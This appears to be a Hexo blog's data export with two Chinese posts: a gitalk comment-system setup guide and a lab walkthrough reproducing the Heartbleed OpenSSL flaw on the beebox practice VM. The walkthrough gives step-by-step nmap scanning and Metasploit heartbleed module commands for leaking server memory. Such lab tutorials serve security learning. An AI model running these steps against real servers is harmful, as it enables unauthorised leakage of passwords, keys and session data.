class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"背景介绍\"><a href=\"#背景介绍\" class=\"headerlink\" title=\"背景介绍\"></a>背景介绍</h3><p>自己一味的输出，倘若收不到别人的反馈，自己也是不会进步的，博客的质量也就只会在当前的水平停止不前，在这样的影响下，我决心要给博客打造一个评论系统，于是我花了点时间深入研究了博客的评论的系统搭建。</p>\n<p>最初，我选择的是github的gitalk。</p>\n<h3 id=\"环境说明\"><a href=\"#环境说明\" class=\"headerlink\" title=\"环境说明\"></a>环境说明</h3><p>我的博客基于hexo，使用的是next主题，这个主题安装之后，在主题的配置文件中，默认存在几个关于评论的系统板块，我们只要针对gitalk这个板块编辑就OK。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"创建仓库\"><a href=\"#创建仓库\" class=\"headerlink\" title=\"创建仓库\"></a>创建仓库</h3><ol>\n<li>直接在github首页创建一个仓库，用来存储博客的评论，相当于一个数据库的作用。</li>\n</ol>\n<ul>\n<li>首先填写一个仓库名字，下面报红是因为我已经创建过一个了。</li>\n<li>仓库描述的话选填，可写可不写。</li>\n<li>选择为public。</li>\n<li>最后点击创建仓库。</li>\n</ul>\n<p><img src=\"/2023/07/14/gitalk-comment/1.png\" alt=\"创建仓库\"></p>\n<ol start=\"2\">\n<li>除了建仓库，还需要注册一个应用。<a href=\"https://github.com/settings/applications/new\">官方注册地址</a>。</li>\n</ol>\n<ul>\n<li>Application name填写的还是一个应用程序的名字，这里我填写的和仓库的名字保持一样了，你们按照喜好来就OK。</li>\n<li>Homepage URL然后填写的是你的网站域名。</li>\n<li>Application description接下来又是一个描述类的信息，选填。</li>\n<li>Authorization callback URL这里同样填写你网站的域名。</li>\n<li>最后注册应用程序等待完成就好。</li>\n</ul>\n<p><img src=\"/2023/07/14/gitalk-comment/2.png\" alt=\"创建应用程序\"></p>\n<ol start=\"3\">\n<li>创建完成后，默认会进入应用程序，接下来要完成一个秘钥的生成。</li>\n</ol>\n<ul>\n<li>Client ID默认会存在。这个待会还会用到。</li>\n<li>默认是不存在密钥的，要点击生成秘钥，生成之后要立刻复制下来，因为保存或者离开页面就变成图例这样了。这个待会还会用到。</li>\n<li>logo可以自己设计一个，感觉蛮不错的。</li>\n<li>都设置完之后点击最下面的Update Application。</li>\n</ul>\n<p><img src=\"/2023/07/14/gitalk-comment/3.png\" alt=\"设置应用程序\"></p>\n<p>后期如果需要对应用程序进行一些修改，可以依次到github头像–&gt;setting–&gt;Developer Settings–&gt;OAuth Apps进行修改。</p>\n<h3 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h3><p>修改配置文件的部分，进入博客主目录，<code>vim themes/next/_config.yml</code></p>\n<ol>\n<li>首先需要把<code>active</code>的值，改为gitalk</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">comments:</span><br><span class=\"line\">  <span class=\"comment\"># Available values: tabs | buttons</span></span><br><span class=\"line\">  style: tabs</span><br><span class=\"line\">  <span class=\"comment\"># Choose a comment system to be displayed by default.</span></span><br><span class=\"line\">  <span class=\"comment\"># Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span></span><br><span class=\"line\">  active: gitalk</span><br><span class=\"line\">  <span class=\"comment\"># Setting `true` means remembering the comment system selected by the visitor.</span></span><br><span class=\"line\">  storage: <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"comment\"># Lazyload all comment systems.</span></span><br><span class=\"line\">  lazyload: <span class=\"literal\">false</span></span><br><span class=\"line\">  <span class=\"comment\"># Modify texts or order for any naves, here are some examples.</span></span><br><span class=\"line\">  nav:</span><br><span class=\"line\">    <span class=\"comment\">#disqus:</span></span><br><span class=\"line\">    <span class=\"comment\">#  text: Load Disqus</span></span><br><span class=\"line\">    <span class=\"comment\">#  order: -1</span></span><br><span class=\"line\">    <span class=\"comment\">#gitalk:</span></span><br><span class=\"line\">    <span class=\"comment\">#  order: -2</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>然后往下滑，找到gitalk的模块。</li>\n</ol>\n<ul>\n<li>enable的值设置为true，表示启用。</li>\n<li>github_id表示你的github的账号。</li>\n<li>repo，填写用来存储评论的仓库。</li>\n<li>client_id之前创建的ID。</li>\n<li>client_secret之前创建好的口令。</li>\n<li>admin_user这个是管理员的账户，也就是你自己的github账号。</li>\n<li>distraction_free_mode默认就好。</li>\n<li>proxy代理值，默认就好。</li>\n<li>language语言类型，别的地方我不管，在我这里必须讲中文。</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gitalk:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  github_id: lxp731 <span class=\"comment\"># GitHub repo owner</span></span><br><span class=\"line\">  repo: hexo-comment <span class=\"comment\"># Repository name to store issues</span></span><br><span class=\"line\">  client_id: b771bc******0002c29 <span class=\"comment\"># GitHub Application Client ID</span></span><br><span class=\"line\">  client_secret: e87e6******531007231*******5ab3c131d3aa1 <span class=\"comment\"># GitHub Application Client Secret</span></span><br><span class=\"line\">  admin_user: lxp731 <span class=\"comment\"># GitHub repo owner and collaborators, only these guys can initialize gitHub issues</span></span><br><span class=\"line\">  distraction_free_mode: <span class=\"literal\">true</span> <span class=\"comment\"># Facebook-like distraction free mode</span></span><br><span class=\"line\">  <span class=\"comment\"># When the official proxy is not available, you can change it to your own proxy address</span></span><br><span class=\"line\">  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token <span class=\"comment\"># This is official proxy address</span></span><br><span class=\"line\">  <span class=\"comment\"># Gitalk&#x27;s display language depends on user&#x27;s browser or system environment</span></span><br><span class=\"line\">  <span class=\"comment\"># If you want everyone visiting your site to see a uniform language, you can set a force language value</span></span><br><span class=\"line\">  <span class=\"comment\"># Available values: en | es-ES | fr | ru | zh-CN | zh-TW</span></span><br><span class=\"line\">  language: zh-CN</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"背景介绍\"><a href=\"#背景介绍\" class=\"headerlink\" title=\"背景介绍\"></a>背景介绍</h3><p>自己一味的输出，倘若收不到别人的反馈，自己也是不会进步的，博客的质量也就只会在当前的水平停止不前，在这样的影响下，我决心要给博客打造一个评论系统，于是我花了点时间深入研究了博客的评论的系统搭建。</p>\n<p>最初，我选择的是github的gitalk。</p>\n<h3 id=\"环境说明\"><a href=\"#环境说明\" class=\"headerlink\" title=\"环境说明\"></a>环境说明</h3><p>我的博客基于hexo，使用的是next主题，这个主题安装之后，在主题的配置文件中，默认存在几个关于评论的系统板块，我们只要针对gitalk这个板块编辑就OK。</p>","more":"<h3 id=\"创建仓库\"><a href=\"#创建仓库\" class=\"headerlink\" title=\"创建仓库\"></a>创建仓库</h3><ol>\n<li>直接在github首页创建一个仓库，用来存储博客的评论，相当于一个数据库的作用。</li>\n</ol>\n<ul>\n<li>首先填写一个仓库名字，下面报红是因为我已经创建过一个了。</li>\n<li>仓库描述的话选填，可写可不写。</li>\n<li>选择为public。</li>\n<li>最后点击创建仓库。</li>\n</ul>\n<p><img src=\"/2023/07/14/gitalk-comment/1.png\" alt=\"创建仓库\"></p>\n<ol start=\"2\">\n<li>除了建仓库，还需要注册一个应用。<a href=\"https://github.com/settings/applications/new\">官方注册地址</a>。</li>\n</ol>\n<ul>\n<li>Application name填写的还是一个应用程序的名字，这里我填写的和仓库的名字保持一样了，你们按照喜好来就OK。</li>\n<li>Homepage URL然后填写的是你的网站域名。</li>\n<li>Application description接下来又是一个描述类的信息，选填。</li>\n<li>Authorization callback URL这里同样填写你网站的域名。</li>\n<li>最后注册应用程序等待完成就好。</li>\n</ul>\n<p><img src=\"/2023/07/14/gitalk-comment/2.png\" alt=\"创建应用程序\"></p>\n<ol start=\"3\">\n<li>创建完成后，默认会进入应用程序，接下来要完成一个秘钥的生成。</li>\n</ol>\n<ul>\n<li>Client ID默认会存在。这个待会还会用到。</li>\n<li>默认是不存在密钥的，要点击生成秘钥，生成之后要立刻复制下来，因为保存或者离开页面就变成图例这样了。这个待会还会用到。</li>\n<li>logo可以自己设计一个，感觉蛮不错的。</li>\n<li>都设置完之后点击最下面的Update Application。</li>\n</ul>\n<p><img src=\"/2023/07/14/gitalk-comment/3.png\" alt=\"设置应用程序\"></p>\n<p>后期如果需要对应用程序进行一些修改，可以依次到github头像–&gt;setting–&gt;Developer Settings–&gt;OAuth Apps进行修改。</p>\n<h3 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h3><p>修改配置文件的部分，进入博客主目录，<code>vim themes/next/_config.yml</code></p>\n<ol>\n<li>首先需要把<code>active</code>的值，改为gitalk</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">comments:</span><br><span class=\"line\">  <span class=\"comment\"># Available values: tabs | buttons</span></span><br><span class=\"line\">  style: tabs</span><br><span class=\"line\">  <span class=\"comment\"># Choose a comment system to be displayed by default.</span></span><br><span class=\"line\">  <span class=\"comment\"># Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span></span><br><span class=\"line\">  active: gitalk</span><br><span class=\"line\">  <span class=\"comment\"># Setting `true` means remembering the comment system selected by the visitor.</span></span><br><span class=\"line\">  storage: <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"comment\"># Lazyload all comment systems.</span></span><br><span class=\"line\">  lazyload: <span class=\"literal\">false</span></span><br><span class=\"line\">  <span class=\"comment\"># Modify texts or order for any naves, here are some examples.</span></span><br><span class=\"line\">  nav:</span><br><span class=\"line\">    <span class=\"comment\">#disqus:</span></span><br><span class=\"line\">    <span class=\"comment\">#  text: Load Disqus</span></span><br><span class=\"line\">    <span class=\"comment\">#  order: -1</span></span><br><span class=\"line\">    <span class=\"comment\">#gitalk:</span></span><br><span class=\"line\">    <span class=\"comment\">#  order: -2</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>然后往下滑，找到gitalk的模块。</li>\n</ol>\n<ul>\n<li>enable的值设置为true，表示启用。</li>\n<li>github_id表示你的github的账号。</li>\n<li>repo，填写用来存储评论的仓库。</li>\n<li>client_id之前创建的ID。</li>\n<li>client_secret之前创建好的口令。</li>\n<li>admin_user这个是管理员的账户，也就是你自己的github账号。</li>\n<li>distraction_free_mode默认就好。</li>\n<li>proxy代理值，默认就好。</li>\n<li>language语言类型，别的地方我不管，在我这里必须讲中文。</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gitalk:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  github_id: lxp731 <span class=\"comment\"># GitHub repo owner</span></span><br><span class=\"line\">  repo: hexo-comment <span class=\"comment\"># Repository name to store issues</span></span><br><span class=\"line\">  client_id: b771bc******0002c29 <span class=\"comment\"># GitHub Application Client ID</span></span><br><span class=\"line\">  client_secret: e87e6******531007231*******5ab3c131d3aa1 <span class=\"comment\"># GitHub Application Client Secret</span></span><br><span class=\"line\">  admin_user: lxp731 <span class=\"comment\"># GitHub repo owner and collaborators, only these guys can initialize gitHub issues</span></span><br><span class=\"line\">  distraction_free_mode: <span class=\"literal\">true</span> <span class=\"comment\"># Facebook-like distraction free mode</span></span><br><span class=\"line\">  <span class=\"comment\"># When the official proxy is not available, you can change it to your own proxy address</span></span><br><span class=\"line\">  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token <span class=\"comment\"># This is official proxy address</span></span><br><span class=\"line\">  <span class=\"comment\"># Gitalk&#x27;s display language depends on user&#x27;s browser or system environment</span></span><br><span class=\"line\">  <span class=\"comment\"># If you want everyone visiting your site to see a uniform language, you can set a force language value</span></span><br><span class=\"line\">  <span class=\"comment\"># Available values: en | es-ES | fr | ru | zh-CN | zh-TW</span></span><br><span class=\"line\">  language: zh-CN</span><br></pre></td></tr></table></figure>"},{"title":"心脏滴血原理与复现","date":"2023-04-22T06:57:00.000Z","_content":"\n### 前期准备\n\n攻击机器还是kali，靶机这里用到的是[beebox](https://sourceforge.net/projects/bwapp/files/bee-box/)，下载完之后解压导入虚拟机就可以开始使用了。\n\n### nmap扫描\n\n攻击发起前，肯定是kali先进行扫描，查看同一网段哪些机器在线。\n\n<!-- more -->\n\n```bash\n  nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n扫描完成后发现有一台192.168.20.136的机器在线，复现心脏滴血用到的端口是8443。\n\n![扫描结果](./heartbleed/1.png)\n\n### 脚本探测\n\n看到机器在线后，使用一个工具探测其8443端口是否可以利用，查看靶机是否有可以利用的机会。\n\n```bash\n  nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse\n```\n\n文字显示是“VULNERABLE”，代表漏洞可以被利用。\n\n![脚本探测](./heartbleed/2.png)\n\n### 开始攻击\n\n打开```msfconsole```工具，搜索```heartbleed```，使用1。\n\n```bash\n  msfconsole -q\n  search heartbleed\n  use 1\n```\n\n![参数设置](./heartbleed/4.png)\n\n使用```show options```查看相应的参数并设置，包括```rport```，```rhost```，```verbose```。\n\n```bash\n  set rport 8443\n  set rhost 192.168.20.136\n```\n\n![参数设置](./heartbleed/5.png)\n\n![参数设置](./heartbleed/8.png)\n\n其中```verbose```是要在```show advanced```下查看的，默认是```false```，我们```set verpose true```设置为```true ```，只有这样我们才能明文显示（终端显示）我们拿到的64K的数据。\n\n```bash\n  show advanced\n  set verbose true\n```\n\n![参数设置](./heartbleed/3.png)\n\n最后可以用```show missing```查看遗漏的设置参数，没有遗漏，就可以开始运行了。\n\n```bash\n  show missing\n  run\n```\n\n![参数设置](./heartbleed/6.png)\n\nkali在这边运行着，然后回到靶机上随便点点点，只要发生操作，就会有数据外泄。\n\n![参数设置](./heartbleed/9.png)\n\n最后我们回到kali，发现已经拿到数据了。\n\n![参数设置](./heartbleed/7.png)\n\n心脏滴血的复现到这里就完成了。","source":"_posts/heartbleed.md","raw":"---\ntitle: 心脏滴血原理与复现\ndate: 2023-04-22 14:57:00\ncategories: 技术\ntags:\n  - 网络安全\n---\n\n### 前期准备\n\n攻击机器还是kali，靶机这里用到的是[beebox](https://sourceforge.net/projects/bwapp/files/bee-box/)，下载完之后解压导入虚拟机就可以开始使用了。\n\n### nmap扫描\n\n攻击发起前，肯定是kali先进行扫描，查看同一网段哪些机器在线。\n\n<!-- more -->\n\n```bash\n  nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n扫描完成后发现有一台192.168.20.136的机器在线，复现心脏滴血用到的端口是8443。\n\n![扫描结果](./heartbleed/1.png)\n\n### 脚本探测\n\n看到机器在线后，使用一个工具探测其8443端口是否可以利用，查看靶机是否有可以利用的机会。\n\n```bash\n  nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse\n```\n\n文字显示是“VULNERABLE”，代表漏洞可以被利用。\n\n![脚本探测](./heartbleed/2.png)\n\n### 开始攻击\n\n打开```msfconsole```工具，搜索```heartbleed```，使用1。\n\n```bash\n  msfconsole -q\n  search heartbleed\n  use 1\n```\n\n![参数设置](./heartbleed/4.png)\n\n使用```show options```查看相应的参数并设置，包括```rport```，```rhost```，```verbose```。\n\n```bash\n  set rport 8443\n  set rhost 192.168.20.136\n```\n\n![参数设置](./heartbleed/5.png)\n\n![参数设置](./heartbleed/8.png)\n\n其中```verbose```是要在```show advanced```下查看的，默认是```false```，我们```set verpose true```设置为```true ```，只有这样我们才能明文显示（终端显示）我们拿到的64K的数据。\n\n```bash\n  show advanced\n  set verbose true\n```\n\n![参数设置](./heartbleed/3.png)\n\n最后可以用```show missing```查看遗漏的设置参数，没有遗漏，就可以开始运行了。\n\n```bash\n  show missing\n  run\n```\n\n![参数设置](./heartbleed/6.png)\n\nkali在这边运行着，然后回到靶机上随便点点点，只要发生操作，就会有数据外泄。\n\n![参数设置](./heartbleed/9.png)\n\n最后我们回到kali，发现已经拿到数据了。\n\n![参数设置](./heartbleed/7.png)\n\n心脏滴血的复现到这里就完成了。","slug":"heartbleed","published":1,"updated":"2024-05-03T03:55:54.857Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fs00637zj3bjn553ip","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"前期准备\"><a href=\"#前期准备\" class=\"headerlink\" title=\"前期准备\"></a>前期准备</h3><p>攻击机器还是kali，靶机这里用到的是<a href=\"https://sourceforge.net/projects/bwapp/files/bee-box/\">beebox</a>，下载完之后解压导入虚拟机就可以开始使用了。</p>\n<h3 id=\"nmap扫描\"><a href=\"#nmap扫描\" class=\"headerlink\" title=\"nmap扫描\"></a>nmap扫描</h3><p>攻击发起前，肯定是kali先进行扫描，查看同一网段哪些机器在线。</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -T4 -A -v -Pn 192.168.20.1/24</span><br></pre></td></tr></table></figure>\n\n<p>扫描完成后发现有一台192.168.20.136的机器在线，复现心脏滴血用到的端口是8443。</p>\n<p><img src=\"/2023/04/22/heartbleed/1.png\" alt=\"扫描结果\"></p>\n<h3 id=\"脚本探测\"><a href=\"#脚本探测\" class=\"headerlink\" title=\"脚本探测\"></a>脚本探测</h3><p>看到机器在线后，使用一个工具探测其8443端口是否可以利用，查看靶机是否有可以利用的机会。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse</span><br></pre></td></tr></table></figure>\n\n<p>文字显示是“VULNERABLE”，代表漏洞可以被利用。</p>\n<p><img src=\"/2023/04/22/heartbleed/2.png\" alt=\"脚本探测\"></p>\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><p>打开<code>msfconsole</code>工具，搜索<code>heartbleed</code>，使用1。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole -q</span><br><span class=\"line\">search heartbleed</span><br><span class=\"line\">use 1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/4.png\" alt=\"参数设置\"></p>\n<p>使用<code>show options</code>查看相应的参数并设置，包括<code>rport</code>，<code>rhost</code>，<code>verbose</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> rport 8443</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 192.168.20.136</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/5.png\" alt=\"参数设置\"></p>\n<p><img src=\"/2023/04/22/heartbleed/8.png\" alt=\"参数设置\"></p>\n<p>其中<code>verbose</code>是要在<code>show advanced</code>下查看的，默认是<code>false</code>，我们<code>set verpose true</code>设置为<code>true </code>，只有这样我们才能明文显示（终端显示）我们拿到的64K的数据。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show advanced</span><br><span class=\"line\"><span class=\"built_in\">set</span> verbose <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/3.png\" alt=\"参数设置\"></p>\n<p>最后可以用<code>show missing</code>查看遗漏的设置参数，没有遗漏，就可以开始运行了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show missing</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/6.png\" alt=\"参数设置\"></p>\n<p>kali在这边运行着，然后回到靶机上随便点点点，只要发生操作，就会有数据外泄。</p>\n<p><img src=\"/2023/04/22/heartbleed/9.png\" alt=\"参数设置\"></p>\n<p>最后我们回到kali，发现已经拿到数据了。</p>\n<p><img src=\"/2023/04/22/heartbleed/7.png\" alt=\"参数设置\"></p>\n<p>心脏滴血的复现到这里就完成了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: 